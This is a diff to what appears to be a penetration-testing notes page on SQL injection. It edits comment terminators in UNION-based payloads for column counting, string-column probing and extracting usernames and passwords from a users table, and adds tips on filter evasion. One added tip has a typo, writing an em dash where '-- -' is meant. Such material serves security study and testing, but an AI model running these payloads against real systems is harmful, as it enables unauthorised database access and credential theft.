@@ -16,9 +16,7 @@
 * OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
 
 {% hint style="warning" %}
-**Warning: OR 1=1**
-
-If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.
+**Warning: `OR 1=1`** If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.
 {% endhint %}
 
 **Database-specific syntax**
@@ -29,18 +27,19 @@ If your condition reaches an UPDATE or DELETE statement, for example, it can res
 
 ## <mark style="color:yellow;">SQL injection UNION attacks</mark>
 
-* Requirements
-  * How many columns are being returned from the original query
-  * Which columns returned from the original query are of a suitable data type to hold the results from the injected query
+Requirements:
+
+* The number of the columns returned by the original query
+* Columns from the original query must support data types for injected query results
 
 ### <mark style="color:yellow;">Determining the number of columns required</mark>
 
 **First way**: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. Example (the injection point is a quoted string within the `WHERE` clause)
 
 ```sql
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
 -- etc.
 ```
 
@@ -48,9 +47,9 @@ If your condition reaches an UPDATE or DELETE statement, for example, it can res
 
 **Second way**: submitting a series of `UNION SELECT` payloads specifying a different number of null values. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
 
-<pre class="language-sql"><code class="lang-sql">' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
+<pre class="language-sql"><code class="lang-sql">' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
 <strong>-- etc.
 </strong></code></pre>
 
@@ -63,10 +62,10 @@ If your condition reaches an UPDATE or DELETE statement, for example, it can res
 Do you want a string?
 
 ```sql
-' UNION SELECT 'a',NULL,NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL--
-' UNION SELECT NULL,NULL,'a',NULL--
-' UNION SELECT NULL,NULL,NULL,'a'--
+' UNION SELECT 'a',NULL,NULL,NULL-- -
+' UNION SELECT NULL,'a',NULL,NULL-- -
+' UNION SELECT NULL,NULL,'a',NULL-- -
+' UNION SELECT NULL,NULL,NULL,'a'-- -
 ```
 
 If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.
@@ -104,7 +103,7 @@ SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'
 You can retrieve multiple values together within this single column by concatenating the values together.
 
 ```sql
-' UNION SELECT username || '~' || password FROM users--
+' UNION SELECT username || '~' || password FROM users-- -
 ```
 
 ## <mark style="color:yellow;">Blind SQLi</mark>
@@ -249,15 +248,16 @@ An application might carry out a SQL query asynchronously (another thread execut
 ## <mark style="color:yellow;">Tips</mark>
 
 * Sometimes when you try to break syntax you receive a response that does not indicate the parameter is vulnerable. **Check if there is a "default" \[error] response** or **Build a valid query** that provides a response indicating the parameter is vulnerable ... Example:
-  * &#x20;`/stockcheck?productID=1` and the response tell you 3 units (stock check)
+  * `/stockcheck?productID=1` and the response tell you 3 units (stock check)
   * `/stockcheck?productID='` and the response tell you 0 units ... in all case that you break...
-  * &#x20;`/stockcheck?productID=1 OR 1=1` the response give you units for all product...
+  * `/stockcheck?productID=1 OR 1=1` the response give you units for all product...
 * **Don't always use `'`** to check. Similar to the above case, it would be pointless
   * `/stockcheck?productID=1` . You know that exists a productID=2? Ok, try to inject `1+1` (instead of `1 OR 1=1` that it can be dangerous).
 * Remember that you can **encode the cookie value**. This may be useful with payload that use `;`.
 * Remember that **SQLi can occur at any location** (UPDATE, INSERT, SELECT \[column, table], ORDER BY)
 * **SQLi can be even in XML/JSON**...
   * If there are some protection, try **XML encode**.
+* Use `— -`  insead of `--` . In many SQL systems, there must be at least one space after `--` for the comment to be recognised.
 
 ## <mark style="color:yellow;">Automatic exploitation</mark>
 
